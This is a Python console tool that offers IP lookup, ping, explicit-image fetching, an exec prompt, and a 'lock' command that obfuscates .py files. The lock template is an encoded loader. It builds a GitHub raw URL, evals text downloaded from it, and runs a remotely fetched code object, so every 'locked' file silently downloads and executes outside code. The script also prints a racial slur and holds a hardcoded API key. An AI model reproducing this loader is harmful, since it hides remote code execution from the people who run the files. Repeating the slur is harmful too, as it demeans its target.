out=['','','','','','','','','','','']
offset=0
obfuscated_vm="(__:=lambda _:bytearray(_).decode(),(___:=__import__,____:=chr,a:=__([(1<<6)+(1<<5)+(1<<3),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<4),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<5)+(1<<4)+(1<<3)+(1<<1),(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<1)+(1<<0),(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<3),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1),(1<<6)+(1<<5)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0),(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<3)+(1<<0),(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4),(1<<6)+(1<<5)+(1<<4)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<1),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1),(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1)]),b:=lambda _:eval(___(__([(1<<6)+(1<<5)+(1<<4)+(1<<1),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0)])).get(_).text),c:=lambda _:___(__([(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)])).loads(bytes.fromhex(__([]).join(_))),e:=[c(b(f'{a}/hex{_}'))for(_)in[(1<<2)+(1<<1)+(1<<0),(1<<3),(1<<3)+(1<<0),(1<<3)+(1<<1),(1<<2)+(1<<1)]],(f:=lambda:__([]),g:={0:(1<<0),(1<<0):(__([]),),(1<<1):b''.join(b(f'{a}/vm')),(1<<1)+(1<<0):(None,*map(ord,__([(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<0)])),*sum(([x,__([])]for(x)in e[:-1]),[]),-4,(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1),-1,(1<<2)+(1<<1)+(1<<0),__([(1<<6)+(1<<5)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<1),(1<<6)+(1<<5)+(1<<3)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0)]),(1<<6)+(1<<5)+(1<<4),(1<<6)+(1<<5)+(1<<1)+(1<<0),____(35),__([]).join(map(____,[(1<<5)+(1<<4),(1<<6)+(1<<5)+(1<<4)+(1<<3)])),(1<<6)+(1<<5)+(1<<2),(1<<6)+(1<<5)+(1<<2)+(1<<1)+(1<<0),(1<<0),(1<<0)-1,(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0),__([(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0)]),e[(1<<2)],__([]),(1<<6)+(1<<5)+(1<<4)+(1<<3)+(1<<0),__([]),(1<<6)+(1<<5)+(1<<3)+(1<<1),(1<<6)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<3)),(1<<2):(1<<1)+(1<<0),(1<<2)+(1<<0):(__([(1<<6)+(1<<5)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<1),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<3)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0)]),__([(1<<6)+(1<<5)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<3),(1<<6)+(1<<5)+(1<<4)+(1<<1)]),__([(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<2),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0)]),__([(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<4)+(1<<1),(1<<6)+(1<<5)+(1<<3)+(1<<0),(1<<6)+(1<<5)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2),(1<<6)+(1<<5)+(1<<2)+(1<<0),(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0),(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0)])),(1<<2)+(1<<1):(1<<4)+(1<<2)+(1<<0),(1<<2)+(1<<1)+(1<<0):(1<<3)+(1<<1)+(1<<0),(1<<3):(____((1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0)),)*((1<<1)+(1<<0))},type(f)(f.__code__.replace(**{i:g[h]for h,i in enumerate(tuple(_ for(_)in dir(f.__code__)if(_[(1<<1)]==(__([(1<<6)+(1<<4)+(1<<3)+(1<<2)+(1<<1)+(1<<0)]))and _[(1<<1)+(1<<0)]in(__([(1<<6)+(1<<5)+(1<<0),(1<<6)+(1<<5)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<1)+(1<<0),(1<<6)+(1<<5)+(1<<4)+(1<<2)+(1<<1)]))and _[((1<<1)+(1<<0)):((1<<2)+(1<<0))]not in[(__([(1<<6)+(1<<5)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<3)+(1<<0)])),(__([(1<<6)+(1<<5)+(1<<2)+(1<<1),(1<<6)+(1<<5)+(1<<4)+(1<<1)]))]and _[-((1<<1)):]!=(__([(1<<6)+(1<<5)+(1<<3)+(1<<2)+(1<<0),(1<<6)+(1<<5)+(1<<2)+(1<<0)])))))}),globals(),__([])))[(1<<1)])[-((1<<0))]('***'))";

import tkinter as tk
from tkinter import filedialog
import math, random, marshal, pyperclip

def copy_to_clipboard(text):
    pyperclip.copy(text)

def fixed_length_password(length, point):
    if length <= point: return length
    else: return length % point or point

def generate_characters_from_password(password, length):
    fixed = []

    for character in list( (password * length)[:length] ):
        session_seed = ord(character) * 678
        random_session = random.Random(session_seed)
        random_number = random_session.randint(457, 875)
        character = chr(random_number)

        fixed.append(character)

    return fixed

def encrypt(string, password):
    characters = []
    generated_characters = generate_characters_from_password(password, 7)
    password_length = len(password)
    reversed_password_first_char_ascii = ord(password[::-1][0])

    for i, char in enumerate(string):
        string_character_ascii = ord(char)
        password_character_ascii = ord(password[fixed_length_password(i + 1, password_length) - 1])

        encrypted_char = chr(string_character_ascii + password_character_ascii + reversed_password_first_char_ascii)
        characters.append(encrypted_char)

    obfuscated_characters = ''.join(
        char + (random.choice(generated_characters) if random.random() > 0.5 else '')
        for char in characters
    )

    scrambled_hexes = ''.join(
        hex(ord(char))[2:] + random.choice('ghijklmno')
        for char in obfuscated_characters
    )

    scrambled_hexes = scrambled_hexes[:-1]
    final_string = scrambled_hexes.upper()[::-1] + random.choice('pqrstuv').upper() + str(random.randint(137, 975))

    return final_string

def serialize_code_object(code_obj):
    return marshal.dumps(code_obj).hex()

def load_and_compile_python_file(file_path):
    with open(file_path, 'r') as file:
        source_code = file.read()
    code_object = compile(source_code, file_path, 'exec')
    return code_object

def encrypt_file(file_path, password):
    code_obj = load_and_compile_python_file(file_path)
    serialized_code = serialize_code_object(code_obj)
    return encrypt(serialized_code, password)

def select_file():
    root = tk.Tk()
    root.withdraw()
    file_path = filedialog.askopenfilename(title="Select a Python file", filetypes=[("Python Files", "*.py")])

    return file_path

def obfuscate_file(password):
	selected_file = select_file()
	encrypted_code = encrypt_file(selected_file, password)
	locked_file = open('\\'.join((sd:=selected_file.split('/'),l:=sd[-1],sd.remove(l))[0])+'\\'+l.replace('.','_locked.'),'w')
	locked_file.write(obfuscated_vm.replace('***',encrypted_code))
	locked_file.close()
	return ('\\'.join((sd:=selected_file.split('/'),l:=sd[-1],sd.remove(l))[0])+'\\'+l.replace('.','_locked.')).split('\\')[-1]

commands = {
	'lock': (lambda password: (
		out.append(f'[~]: lock {password}'),
		out.append('    successfully obfuscated program!'),
		out.append('    saved as: ' + obfuscate_file(password))
	)),

	'commands': (lambda: (
		out.append(f'[~] : commands'),
		out.append('    =           : scrolls up'),
		out.append('    -           : scrolls down'),
		out.append('    clear       : clears the console'),
		out.append(''),
		out.append('    ip          : shows your network ip'),
		out.append('    ping [ip]   : pings ip'),
		out.append('    lookup [ip] : shows ip information'),
		out.append('    img [type]  : opens an image of a certain type'),
		out.append('                  pgif / 4k / hneko / anal / gonewild'),
		out.append('                  ass / pussy / thigh / boobs'),
		out.append('    exec        : opens a code editor where you\'re'),
		out.append('                  able to execute 10 lines of code'),
		out.append('                  at a time'),
		out.append('    lock [pwd]  : obfuscates any .py file with the'),
		out.append('                  given password, this will bring up'),
		out.append('                  a file selector prompt where you'),
		out.append('                  pick your file of choice.')
	)),

	'help': (lambda: (
		out.append(f'[~] : help'),
		out.append('    ; / \'       : scrolls up / down'),
		out.append('    clear       : clears the console'),
		out.append('    lock [pwd]  : obfuscates any .py file with the'),
		out.append('                  given password, this will bring up'),
		out.append('                  a file selector prompt where you'),
		out.append('                  pick your file of choice.'),
		out.append('    exec        : opens a code editor where you\'re'),
		out.append('                  able to execute 10 lines of code'),
		out.append('                  at a time'),
	)),

	'img': (lambda img_type, amount = 1: (
		out.append(f'[~] : img {img_type} {amount}'),
		out.append(f'      freak ass nigga ! '),
		[__import__('webbrowser').open(__import__('requests').get(f'https://nekobot.xyz/api/image?type={img_type}').json()['message']) for _ in range(int(amount))],
	)),

	'ip': (lambda: (
		out.append(f'[~] : ip'),
		ip := __import__('requests').get('https://api.ipify.org').text,
		out.append('    ' + ip)
	)),

	'ping': (lambda ip: (
		out.append(f'[~] : ping {ip}'),
		ping_information := __import__('subprocess').check_output(f'ping {ip}').decode('utf-8').split('\r\n')[1:-1],
		[out.append(_) for _ in ping_information]
	)),

	'lookup': (lambda ip: (
		out.append(f'[~] : lookup {ip}'),
		ip_information := __import__('requests').get(f'https://extreme-ip-lookup.com/json/{ip}?key=Qn97RtiI2gwjStzJJjuG').json(),
		out.append('    continent : ' + ip_information['continent']),
		out.append('    country   : ' + ip_information['country'] + ' (' + ip_information['countryCode'] + ')'),
		out.append('    region    : ' + ip_information['city'] + ', ' + ip_information['region']),

		out.append(''),
		out.append('    asn       : ' + ip_information['asnOrg']),
		out.append('                ' + ip_information['asnName'] + ' (' + ip_information['asn'] + ')'),
	)),

	'buffer': (lambda: (
		[print(f"\033[{2+_};31H"+ ("║ "+out[- ( (11-(_+1)) + offset )]+(" "*(56-len(out[-((11-(_+1)) + offset)])))+"║")) for _ in range(10)]
	)),

	'hide': (lambda: (
		[print(f"\033[{2+_};31H"+ ("║ "+(" "*56)+"║")) for _ in range(10)]
	)),

	'clear': (lambda: (
		out.append(' '),
		out.append(' '),
		out.append(' '),
		out.append(' '),
		out.append(' '),
		out.append(' '),
		out.append(' '),
		out.append(' '),
		out.append(' '),
		out.append(' '),
	)),

	'exec': (lambda: (
		out.append('[~] : exec'),
		commands['buffer'](),commands['hide'](),exec('out=(lambda _:out.append("    "+str(_)));\n' + '\n'.join([
			(n:=('0'*(3-len(str(_))))+str(_),input(f"\033[{1+_};32H {n} : "))[1]
			for _ in range(1, 11)
		])),commands['buffer'](),
	)),

	'\'': (lambda : (
		globals().__setitem__('offset', offset-1)
	)),

	';': (lambda : (
		globals().__setitem__('offset', offset+1)
	)),
}


image = "   _     _   \n  (c).-.(c)  \n   / ._. \\   \n __\\( Y )/__ \n(_.-/'-'\\-._)\n   || # ||   \n _.' `-' '._ \n(.-./`-'\\.-.)\n`-'     `-\'\n".split('\n')

for _ in range(1000):
    __import__('os').system('cls && mode con: cols=90 lines=13')
    size = __import__('shutil').get_terminal_size()
    c,l=size.columns, size.lines
    print('\n'.join([line.center(30) for line in image]))
    print(' [' + (' ' * 26) + ']')
    print("\033[1;31H" + ("╔" + ("═" * 57) + "╗"))

    [
        print(f"\033[{2 + _};31H" + (
            "║ " + out[-((11 - (_ + 1)) + offset)] + (" " * (56 - len(out[-((11 - (_ + 1)) + offset)]))) + "║"
        )) for _ in range(10)
    ]

    print("\033[12;31H" + ("╚" + ("═" * 57) + "╝"))

    command = input('\033[A\033[A [ ')
    command_name = command.split(' ')[0]

    if command_name in commands.keys():
        try:
            commands[command_name](*command.split(' ')[1:])
        except Exception as exception:
            exception = str(exception).replace('<lambda>()', f'"{command_name}"')\
                .replace('required positional ', '').replace(' and ', ' & ')
            out.append(f'[!]: {exception}')
    else:
        out.append(f'[!] : command "{command}" not found!')
